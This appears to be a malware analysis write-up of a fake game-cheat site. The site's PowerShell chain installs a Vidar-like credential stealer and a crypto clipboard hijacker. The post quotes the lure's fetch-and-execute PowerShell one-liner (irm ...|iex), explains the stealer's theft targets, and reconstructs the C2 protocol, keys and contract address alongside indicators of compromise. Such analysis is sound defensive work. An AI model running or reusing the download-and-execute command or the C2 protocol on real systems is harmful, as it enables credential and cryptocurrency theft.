---
title: "Github Lure #1"
summary: A repository disguised as game cheats apparently doesn't really install them :o
family: Vidar
filetype: PE executables (.exe)
platform: Windows x64
size: 830MB (18MB)
first_seen: 2026-10-*
sha256: C8C98F125AD6593BE01F56A833384B03F0F514800026B2270A6604BC5E1997BE
tags: [windows, clipboard, stealer]
---

There's so many campaigns disguised as game cheats, it's insane. They're being constantly pushed up when sorted by "Recently Updated", and no one is doing a damn thing?? It's been like this for at least a year now..

Anyways, here's a pretty rundown of one!
## The beginning

We start off with a simple, clanked website. The manual download button says it's broken and to use the automatic install.
![The super-duper site](/assets/img/lure1/site1.png)

The automatic install is an almost clickfix-styled attack. It wants you to copy this code and paste it:
```powershell
(irm 'httxs://simplesetups.org/hex/app-setup' -TimeoutSec 45)|iex; Write-Host 'Best-Gaming-Cheats-Package'
```

The site contains powershell code, this time very weakly obfuscated. It's entire point is to fetch more powershell! This time, however, it begins enforcing a User-Agent and a new URL.

Our next powershell is again a piece of junk, downloading *more* powershell from yet another new URL and with a different User-Agent again.

You just might not believe it... the fourth powershell stage is ran to get more powershell! But this time also to ensure it's running as administrator. If it's not, it prompts the user to accept a UAC prompt that runs a script it downloads that will resume it's infection. Of course, the next (and last!) powershell is downloaded.

This one finally decides to download and extract two zip files from an IP address. The zip file hashes are listed in the IoC section. The archives are passwordless and both contain binaries and junk files. In total, we have **3** binaries.

## AppStart.exe
Let's start with the easiest one. The binary ```AppStart.exe``` comes with ```AppStart.dll```. It's entire point is to just load it. Thankfully, the .dll file is in C#, and exports a single function with one line (so much effort lmao). 
The line is:
```cs
Environment.FailFast("A fatal error occurred in the application.").
```

That's it.

## stable.exe
This one is finally doing something! This is a native binary. It's entire goal is to steal.

It's C2 URL is recovered from literals around RVA `0x1adf`, followed by XOR `0xfe` at RVA `0x1b7a`. The decodedvalue feeds the server-list init path around RVA `0x1ab0`. The C2 routine at RVA `0xfa0` uses this list.

The code resolved WinINet operations, notably: `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile` and `InternetWriteFile`. 

Some of the recovered strings include: `FileUploader/1.0` (seems like a user agent again), some JSON and multipart cotnent types, `X-Content-Encoding: gzip` and a marker for closing the session. 

The main stealer routine begins at RVA `0xd64c0`. It's modules include:
- Screenshots, clipboard content, system information, process list and installed applications
- Chromium databases, browser and local storage AND/OR Firefox password + local storage
- Wallets
- Discord tokens, Telegram, Signal, Session, Element, WhatsApp, Viber, Skype, Tox and Pidgin files
- Steam, Battle.net, Epic, Riot and Ubisoft files
- VPN, Outlook, Filezilla and the Wi-Fi
- Also a configurable grabber and downloader to add to the heat!

It is capable of injection into a browser process, as well as launching one with the flags `--headless=new` / `--no-sandbox` / `--no-startup-window`, manual mapping and a helper .dll file for this process.

There have been two strings that identify the family, although it is not sure: `VIDAR`, `AbeVidarExtractKey`

## DeskNotes.exe
The original binary is chunky. ~830MB to be exact. It is UPX packed, and most of it is noise however (around 843,321,344 bytes to be exact). Removing the null noise and unpacking leaves us with an 18MB binary.

The binary contains `.managed` and `hydrated` sections, as well as a NativeAOT directory. The CLR directory, however, is absent. We can rehydrate the metadata using a python script just fine, resulting in an RVA region at `0x9cd000`. The region is `0x3c1920` bytes long, and contains **8812 string objects``.

The binary seems to be a clipboard hijacker, as these path were recovered:
- RVA `0x692820` => Registers a window + clipboard listener. Its path logs `AddClipboardFormatListener` using lifecycle messages.
- RVA `0x698ab0` => Obtains clipboard text, suppresses unchanged values, logs the original clipboard content, sends it to the C2 API and processes a replacement string if needed.
- RVA `0x6973b0` => Parses the API responses, specifically `processed_text`, `text`, `address`, `clipboard`, `encrypted_data`....
- RVA `0x6985d0` allocates and writes the replacement data. It avoids rewriting old or empty API responses.

The binary also fetches it's C2 using etherhiding.

Probably an address swapper.

### Configuration and API discovery

| Item | Recovered value / evidence |
|---|---|
| Build label | `Oct_24`, object RVA `0xa55468` |
| Shared API key material | `e54f2793a493cdf0fc42e1d1653d1b80`, object RVA `0xa834b8` |
| HTTP header | `X-API-KEY`; populated from the static key in RVA `0x696e10` |
| Request/response encryption | AES-256 CBC, PKCS7; the encrypted response is Base64-decoded, with a 16-byte IV prefix followed by ciphertext (RVA `0x6969e0`). |
| AES key derivation | SHA256 of UTF-8 key material, RVA `0x696d00`; its hash constructor at `0x655cd0` selects the literal `SHA256`. |
| Derived AES key | `b148999279bd909b9ed43830cf0fc3faaf0a2903642c52f30fce8e9f4065cc89` |
| Contract address | `0x8447e392f0951c4185cee4cbc5fef6beb3fc8d1c`; 20 bytes copied from RVA `0x103c1a0` by `0x697db0` |
| Contract method selector | `0xb68d1809` |
| RPC operation | `eth_call`, block tag `latest` |
| API path | `/api/` |
| Last mapped domain | `https://megeve.beer` |

### Protocol reconstruction
The malware check-ins and clipboard submissions PSOT to the resolved URL as forms. The `json` field contains `{"encrypted_data":"..."}`. Encryption is UTF-8 without a BOM, AES-256-CBC/PKCS7, then Base64 of the 16-byte IV followed by the ciphertext.

It's check-in fields contain:
- hwid
- pcName
- userName
- isAdmin (string 0/1)
- unique_id (the build label!)
- os

Clipboard fields contain:
- text
- title
- hwid
- unique_id

They also support JPEG uploads.

### Persistence
The malware contains installation logic with Powershell/COM/VBS shortcuts, a batch fallback and Run-key.

## Indicators of compromise

| Type | Indicator |
|---|---|
| Domain | `https://rtbsoftware.org/` |
| Domain | `https://simplesetups.org/` |
| Domain | `https://t-trustrest.com/` |
| Domain | `https://goodlandfp.com/` |
| C2 Domain | `https://megeve.beer/` |
| IP address | `93[.]152[.]220[.]124` |
| C2 IP address | `82[.]25[.]63[.]31` |
| User-Agent | `FileUploader/1.0` |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36` |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6074.78 Safari/537.36 Edg/124.0.6074.78` |
| File | `C:\Apps\DeskNotes\DeskNotes.exe` |
| File | `%TEMP%\svc_work\out2\AppStart.exe` |
| File | `%TEMP%\svc_work\out2\AppStart.dll` |
| File | `%TEMP%\svc_work\out2\stable.exe` |
| File | `%temp%\svc_work\pkg1.zip` |
| File | `%TEMP%\svc_work\pkg2.zip` |
| DeskNotes SHA-256 | `C8C98F125AD6593BE01F56A833384B03F0F514800026B2270A6604BC5E1997BE` |
| AppStart.exe SHA-256 | `0D1C38C6ACFB2AEFC0A9E238E32655BF33FA2FC088DE8D02D59AD0AA595D0A95` |
| AppStart.dll SHA-256 | `ECF14B087E6CB2F847FB533C4BAE7BF276AA87F3489897E73CFEA126261E1BA2` |
| stable.exe SHA-256 | `28F4630B283F8E821AC37CB3A3E6703C78DCC1DC95FBDE039E18971D032C29F3` |
| FFF.dll (stable's helper) SHA-256 | `6C285F3DAA2FA6B03858C30FA7A030CBACF131239347C224681F24FD238BA139` |
| pkg1.zip SHA-256 | `067A524798AA8A0C4E6A0030815CB0AE1888309D411E312D8510388EDC246B79` |
| pkg2.zip SHA-256 | `90C746B7F89A352D270C7C8FDF8A7BBBE14957143FC293A4A75BCDBD256BA661` |
| Smart Contract | `0x8447e392f0951c4185cee4cbc5fef6beb3fc8d1c` |

## Takeaways

Please don't download game cheats off of github. Or anywhere, for that matter. For the people who like flowcharts:
![The full chain](/assets/img/lure1/flowchart.png)